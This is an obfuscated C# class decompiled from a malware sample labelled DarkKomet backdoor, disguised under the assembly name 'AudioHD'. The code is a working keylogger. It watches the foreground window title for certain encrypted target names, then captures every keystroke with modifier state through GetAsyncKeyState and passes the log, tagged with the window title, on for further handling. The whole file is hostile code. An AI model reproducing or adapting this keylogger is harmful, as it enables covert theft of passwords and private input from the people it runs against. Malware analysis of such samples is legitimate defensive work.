// Decompiled with JetBrains decompiler
// Type: 
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

public sealed class \u0002
{
  private static \u0003\u2001 \u0002 = new \u0003\u2001();
  private static string \u0003;
  private static string \u0005 = string.Empty;
  private static System.Timers.Timer \u0008;
  private static System.Timers.Timer \u0006;
  private static string \u000E;
  private static string \u000F;
  public static string \u0002\u2000;
  public static string \u0003\u2000;
  public static string \u0005\u2000;
  private static bool \u0008\u2000 = false;
  private static bool \u0006\u2000 = false;
  private static bool \u000E\u2000 = false;

  [DllImport("User32.dll")]
  private static extern short GetAsyncKeyState(Keys _param0);

  [DllImport("User32.dll")]
  private static extern short GetAsyncKeyState(int _param0);

  [DllImport("User32.dll")]
  public static extern int GetWindowText(int _param0, StringBuilder _param1, int _param2);

  [DllImport("User32.dll")]
  public static extern int GetForegroundWindow();

  public static void \u0002()
  {
    \u0002.\u000E = \u0002.\u0002();
    \u0002.\u000F = \u0002.\u000E;
    \u0002.\u0003 = string.Empty;
    \u0002.\u0008 = new System.Timers.Timer();
    \u0002.\u0008.Elapsed += new ElapsedEventHandler(\u0002.\u0002);
    \u0002.\u0008.Interval = 10.0;
    \u0002.\u0008.Enabled = false;
    while (true)
    {
      string upper = \u0002.\u0002().ToUpper();
      if (upper.Contains(\u0006\u2002.\u0002(-885876423)) || upper.Contains(\u0006\u2002.\u0002(-885876436)) || upper.Contains(\u0006\u2002.\u0002(-885876450)) || upper.Contains(\u0006\u2002.\u0002(-885876466)) || upper.Contains(\u0006\u2002.\u0002(-885876353)) || upper.Contains(\u0006\u2002.\u0002(-885876368)) || upper.Contains(\u0006\u2002.\u0002(-885876379)) || upper.Contains(\u0006\u2002.\u0002(-885876390)) || upper.Contains(\u0006\u2002.\u0002(-885876412)) || upper.Contains(\u0006\u2002.\u0002(-885876294)) || upper.Contains(\u0006\u2002.\u0002(-885876319)) || upper.Contains(\u0006\u2002.\u0002(-885876336)) || upper.Contains(\u0006\u2002.\u0002(-885876350)) || upper.Contains(\u0006\u2002.\u0002(-885876244)))
      {
        \u0002.\u0008.Start();
        if (\u0002.\u0005 == string.Empty)
          \u0002.\u0005 = upper;
      }
      else if (\u0002.\u0003 != string.Empty)
      {
        \u0002.\u0008.Stop();
        \u0002.\u0002.\u0002(\u0002.\u0005, \u0002.\u0003);
        \u0002.\u0003 = string.Empty;
      }
      Thread.Sleep(1000);
    }
  }

  public static string \u0002()
  {
    int foregroundWindow = \u0002.GetForegroundWindow();
    StringBuilder stringBuilder = new StringBuilder(1024);
    int windowText = \u0002.GetWindowText(foregroundWindow, stringBuilder, stringBuilder.Capacity);
    return windowText <= 0 || windowText > stringBuilder.Length ? \u0006\u2002.\u0002(-885876262) : stringBuilder.ToString();
  }

  private static void \u0002(object _param0, ElapsedEventArgs _param1)
  {
    foreach (int num in Enum.GetValues(typeof (Keys)))
    {
      if (\u0002.GetAsyncKeyState(num) == (short) -32767)
      {
        if (\u0002.\u0002())
        {
          if (!\u0002.\u0006\u2000)
          {
            \u0002.\u0006\u2000 = true;
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876280);
          }
        }
        else if (\u0002.\u0006\u2000)
        {
          \u0002.\u0006\u2000 = false;
          \u0002.\u0003 += \u0006\u2002.\u0002(-885876680);
        }
        if (\u0002.\u0008())
        {
          if (!\u0002.\u0008\u2000)
          {
            \u0002.\u0008\u2000 = true;
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876693);
          }
        }
        else if (\u0002.\u0008\u2000)
        {
          \u0002.\u0008\u2000 = false;
          \u0002.\u0003 += \u0006\u2002.\u0002(-885876712);
        }
        if (\u0002.\u0005())
        {
          if (!\u0002.\u000E\u2000)
          {
            \u0002.\u000E\u2000 = true;
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876728);
          }
        }
        else if (\u0002.\u000E\u2000)
        {
          \u0002.\u000E\u2000 = false;
          \u0002.\u0003 += \u0006\u2002.\u0002(-885876620);
        }
        if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885876637))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885876655);
        else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885876666))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885876556);
        else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885876571))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885876578);
        else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885876600))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885876484);
        else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885876492))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885876501);
        else if (!(Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885876519)) && !(Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885876536)) && !(Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875910)) && !(Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885876536)) && !(Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875932)) && !(Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875947)) && !(Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875963)))
        {
          if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875851))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875864);
          else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875876))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875885);
          else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875897))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875784);
          else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875793))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875807);
          else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875819))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875825);
          else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875837))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875721);
          else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875737))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875756);
          else if (Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885875770) || Enum.GetName(typeof (Keys), (object) num) == \u0006\u2002.\u0002(-885876165))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876180);
        }
        else
          continue;
        if (\u0002.\u0003())
        {
          if (num >= 65 && num <= 122)
            \u0002.\u0003 += (string) (object) (char) num;
          else if (num.ToString() == \u0006\u2002.\u0002(-885876192))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876197);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876205))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876214);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876222))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876107);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876115))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876124);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876132))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876137);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876145))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876154);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876034))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876047);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876055))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876064);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876072))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876077);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876085))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876094);
          else if (num.ToString() == \u0006\u2002.\u0002(-885875974))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875988);
          else if (num.ToString() == \u0006\u2002.\u0002(-885875996))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876002);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876010))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885876024);
          else if (num.ToString() == \u0006\u2002.\u0002(-885876032))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875398);
          else if (num.ToString() == \u0006\u2002.\u0002(-885875406))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875420);
          else if (num.ToString() == \u0006\u2002.\u0002(-885875428))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875434);
          else if (num.ToString() == \u0006\u2002.\u0002(-885875442))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875456);
          else if (num.ToString() == \u0006\u2002.\u0002(-885875336))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875342);
          else if (num.ToString() == \u0006\u2002.\u0002(-885875350))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875364);
          else if (num.ToString() == \u0006\u2002.\u0002(-885875372))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875378);
          else if (num.ToString() == \u0006\u2002.\u0002(-885875386))
            \u0002.\u0003 += \u0006\u2002.\u0002(-885875272);
        }
        else if (num >= 65 && num <= 122)
          \u0002.\u0003 += (string) (object) (char) (num + 32);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876192))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875280);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876205))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875288);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876222))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875296);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876115))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875304);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876132))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875312);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876145))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875320);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876034))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875328);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876055))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875208);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876072))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875216);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876085))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875224);
        else if (num.ToString() == \u0006\u2002.\u0002(-885875996))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875232);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876010))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875240);
        else if (num.ToString() == \u0006\u2002.\u0002(-885875248))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875253);
        else if (num.ToString() == \u0006\u2002.\u0002(-885876032))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875261);
        else if (num.ToString() == \u0006\u2002.\u0002(-885875406))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875653);
        else if (num.ToString() == \u0006\u2002.\u0002(-885875428))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875661);
        else if (num.ToString() == \u0006\u2002.\u0002(-885875442))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875669);
        else if (num.ToString() == \u0006\u2002.\u0002(-885875336))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875677);
        else if (num.ToString() == \u0006\u2002.\u0002(-885875350))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875685);
        else if (num.ToString() == \u0006\u2002.\u0002(-885875372))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875693);
        else if (num.ToString() == \u0006\u2002.\u0002(-885875386))
          \u0002.\u0003 += \u0006\u2002.\u0002(-885875701);
      }
    }
  }

  public static bool \u0002() => Convert.ToBoolean((int) \u0002.GetAsyncKeyState(Keys.ControlKey) & 32768);

  public static bool \u0003() => Convert.ToBoolean((int) \u0002.GetAsyncKeyState(Keys.ShiftKey) & 32768);

  public static bool \u0005() => Convert.ToBoolean((int) \u0002.GetAsyncKeyState(Keys.Capital) & 32768);

  public static bool \u0008() => Convert.ToBoolean((int) \u0002.GetAsyncKeyState(Keys.Menu) & 32768);

  public bool \u0002() => \u0002.\u0008.Enabled && \u0002.\u0006.Enabled;

  public void \u0002(bool _param1) => \u0002.\u0008.Enabled = \u0002.\u0006.Enabled = _param1;

  public double \u0002() => \u0002.\u0006.Interval;

  public void \u0002(double _param1) => \u0002.\u0006.Interval = _param1;

  public double \u0003() => \u0002.\u0008.Interval;

  public void \u0003(double _param1) => \u0002.\u0008.Interval = _param1;
}
